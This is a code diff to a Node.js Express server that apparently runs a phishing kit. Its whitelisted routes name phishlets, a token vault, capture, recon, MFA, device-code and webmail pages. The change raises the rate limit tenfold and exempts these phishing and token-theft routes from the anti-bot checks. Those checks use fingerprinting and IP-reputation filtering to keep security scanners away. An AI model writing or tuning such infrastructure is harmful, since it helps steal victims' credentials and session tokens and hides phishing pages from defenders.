@@ -73,9 +73,10 @@ function corsMiddleware(req, res, next) {
 // ============================================================
 
 // 1. Rate Limiting
+// ── ✅ RATE LIMITER — INCREASED ──
 const limiter = rateLimit ? rateLimit({
-    windowMs: 15 * 60 * 1000,
-    max: 100,
+    windowMs: 15 * 60 * 1000,  // 15 minutes
+    max: 1000,                 // ✅ Increased from 100 to 1000
     message: { error: 'Too many requests, please try again later.' },
     standardHeaders: true,
     legacyHeaders: false,
@@ -183,7 +184,33 @@ function validateRequestSignature(req) {
 }
 
 // 6. Complete Anti-Bot Middleware
+// ── ✅ WHITELISTED ROUTES ──
+const WHITELISTED_ROUTES = [
+    '/dash/api/webmail',
+    '/dash/api/recon',
+    '/dash/api/capture',
+    '/dash/api/notify',
+    '/dash/api/prt/list',
+    '/dash/api/prt/stats',
+    '/dash/api/device/history',
+    '/dash/api/device/stats',
+    '/dash/api/device/manual',
+    '/dash/api/device/use',
+    '/dash/api/vault/tokens',
+    '/dash/api/vault/stats',
+    '/dash/api/logs',
+    '/dash/api/visits',
+    '/dash/api/analytics',
+    '/dash/api/phishlets',
+    '/verify',
+    '/device',
+    '/webmail',
+    '/mfa'
+];
+
+// ── ✅ ANTI-BOT MIDDLEWARE — FIXED ──
 async function antiBotMiddleware(req, res, next) {
+    // Skip static assets
     if (req.path.includes('.css') || req.path.includes('.js') || 
         req.path.includes('.png') || req.path.includes('.jpg') ||
         req.path.includes('.ico') || req.path.includes('.woff') ||
@@ -191,40 +218,52 @@ async function antiBotMiddleware(req, res, next) {
         return next();
     }
     
-    if (req.path.startsWith('/dash/') && !req.path.includes('/dash/api/')) {
-        return next();
+    // ✅ SKIP WHITELISTED ROUTES (no anti-bot checks)
+    for (const route of WHITELISTED_ROUTES) {
+        if (req.path.startsWith(route)) {
+            console.log(`✅ Whitelisted: ${req.path} - skipping anti-bot`);
+            return next();
+        }
     }
     
+    // ⚠️ Only apply anti-bot to non-whitelisted routes
+    
+    // Rate limiting (only for non-whitelisted)
     if (rateLimit) {
         limiter(req, res, (err) => {
             if (err) return next(err);
         });
     }
     
+    // Browser Fingerprint
     const fingerprint = validateBrowserFingerprint(req);
     if (!fingerprint.valid) {
         console.log(`🛡️ Blocked: ${fingerprint.reason} - ${req.ip}`);
         return res.status(403).json({ error: 'Access denied' });
     }
     
+    // IP Reputation
     const ipCheck = await checkIPReputation(req.ip);
     if (ipCheck.blocked) {
         console.log(`🛡️ Blocked: IP reputation - ${req.ip} (${ipCheck.reason})`);
         return res.status(403).json({ error: 'Access denied' });
     }
     
+    // Bot Detection
     const botCheck = detectBotBehavior(req);
     if (botCheck.isBot) {
         console.log(`🛡️ Blocked: Bot detected - ${req.ip} (${botCheck.reason})`);
         return res.status(403).json({ error: 'Access denied' });
     }
     
+    // Request Signature
     const signature = validateRequestSignature(req);
     if (!signature.valid) {
         console.log(`🛡️ Blocked: Invalid request signature - ${req.ip} (${signature.reason})`);
         return res.status(403).json({ error: 'Access denied' });
     }
     
+    // Security Headers
     res.header('X-Frame-Options', 'DENY');
     res.header('X-Content-Type-Options', 'nosniff');
     res.header('Referrer-Policy', 'same-origin');
@@ -232,7 +271,6 @@ async function antiBotMiddleware(req, res, next) {
     
     next();
 }
-
 // 7. Bot Trap (honeypot)
 function botTrapMiddleware(req, res, next) {
     if (req.body && req.body.__honey) {
